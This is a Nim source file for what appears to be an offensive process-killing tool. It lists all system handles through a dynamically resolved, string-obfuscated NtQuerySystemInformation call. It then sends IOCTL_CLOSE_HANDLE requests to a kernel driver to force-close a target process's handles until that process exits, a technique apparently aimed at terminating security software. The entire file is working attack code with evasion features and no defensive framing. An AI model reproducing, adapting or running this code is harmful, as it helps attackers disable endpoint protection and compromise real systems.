import winim, types, std/strformat, dinvoke
import obf

proc get_target_handle*(pid : int) : HANDLE = 
    var target_handle : HANDLE = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, cast[DWORD](pid))
    if (target_handle == INVALID_HANDLE_VALUE) :
        echo fmt"[-] error invalid handle value pid : {pid}"
    else :
        echo fmt"[+] got handle on {pid}"
        
    return target_handle

proc reallocate_handle_info_table_size*(ulTable_size : ULONG, handleInformationTable : psystem_HANDLE_INFORMATION) : psystem_HANDLE_INFORMATION =
    var 
        hHeap : HANDLE = GetProcessHeap()
        pSysHandle : psystem_HANDLE_INFORMATION

    HeapFree(hHeap, HEAP_NO_SERIALIZE, handleInformationTable)

    #dump ret

    pSysHandle = cast[psystem_HANDLE_INFORMATION](HeapAlloc(hHeap, HEAP_ZERO_MEMORY, ulTable_size))
    return pSysHandle

proc get_handle_tab_info*() : psystem_HANDLE_INFORMATION = 
    var hNtdll = GetModuleHandleA(obf("Ntdll.dll"))
    if (hNtdll == 0):
        echo obf("[-] error can't find ntdll")
        quit(-1)

    var NtQuerySystemInformation : NtQuerySystemInformation_t

    NtQuerySystemInformation = cast[NtQuerySystemInformation_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(obf("ntdll.dll"), FALSE)), obf("NtQuerySystemInformation"), 0, TRUE)))
    
    if (NtQuerySystemInformation == nil):
        echo obf("[-] error can't find NtQuerySystemInformation")
        quit(-1)

    var 
        handleInformationTable : psystem_HANDLE_INFORMATION
        status : NTSTATUS = STATUS_INFO_LENGTH_MISMATCH
        ulSystemInfoLength : ULONG = sizeof(windef.system_HANDLE_INFORMATION) + (sizeof(system_HANDLE_TABLE_ENTRY_INFO) * 100) - 2300;

    handleInformationTable = reallocate_handle_info_table_size(ulSystemInfoLength, handleInformationTable)
    while status == STATUS_INFO_LENGTH_MISMATCH :
        status = NtQuerySystemInformation(CONST_SYSTEM_HANDLE_INFORMATION, handleInformationTable, ulSystemInfoLength, NULL)

        if (status == STATUS_INFO_LENGTH_MISMATCH) : 
            ulSystemInfoLength = ulSystemInfoLength * 2 
            handleInformationTable = reallocate_handle_info_table_size(ulSystemInfoLength, handleInformationTable)

        elif (status != 0) :
            echo fmt"[-] error {GetLastError()}"

    return handleInformationTable

proc kill_target_rewrite*(driver_handle : HANDLE, target_handle : USHORT, pid : int, target_handle_object : PVOID) =
    var 
        ctrl : ioControl
        lpObjectAddress_closing : PVOID
        res : bool

    lpObjectAddress_closing = target_handle_object #get_handle_object(target_handle, pid)


    ctrl = ioControl(ulPID : pid, lpObjectAddress : lpObjectAddress_closing, ulSize : 0, ulHandle : cast[ULONGLONG](target_handle))
    res = DeviceIoControl(driver_handle, cast[DWORD](IOCTL_CLOSE_HANDLE), cast[LPVOID](addr(ctrl)), cast[DWORD](sizeof(ioControl)), NULL, 0, NULL, NULL)


proc handle_grinder*(driver_handle : HANDLE, target_handle : HANDLE, pid : int) =
    var
        handleInformationTable : psystem_HANDLE_INFORMATION = get_handle_tab_info()
        handle_info : system_HANDLE_TABLE_ENTRY_INFO
        status : DWORD

    for i in 0..handleInformationTable.number_of_handles :

        handle_info = handleInformationTable.handles[i]

        if (handle_info.processId == pid) :

            if ((i mod 15) == 0 ) :
                GetExitCodeProcess(target_handle, addr(status))
                if (status != STILL_ACTIVE) :
                    return
                
            else :
                kill_target_rewrite(driver_handle, handleInfo.handle, pid, handleInfo.object_thingy)
